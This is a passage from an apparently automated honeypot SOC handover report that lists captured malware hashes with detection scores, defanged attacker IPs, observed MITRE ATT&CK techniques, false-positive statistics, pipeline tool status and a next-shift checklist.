| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `195.178.110[.]204` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 32 |
| `43.248.184[.]188` | CN | Suqian Pugongying Network Service Co.,Ltd | **100** ⚠️ | 7 |
| `218.161.99[.]102` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 17 |
| `112.4.79[.]138` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `14.103.127[.]82` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `8.219.164[.]76` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 41 |
| `180.76.105[.]165` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `131.221.236[.]23` | BR | OuriNet TELECOM | **100** ⚠️ | 50 |
| `125.91.106[.]241` | CN | CHINANET Guangdong province network | **100** ⚠️ | 39 |
| `45.33.86[.]112` | US | Linode | **35** | 9 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 31 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1053.003](https://attack.mitre.org/techniques/T1053/003) | 3 |

---

## 🔕 False Positive Summary (127 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 125 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 162 cases |
| Tool 34  | Credential Extractor        | ✅ 11 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 12 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 127 filtered (78.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 7 recon entry/entries in table (1 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-07T15:06:50Z_
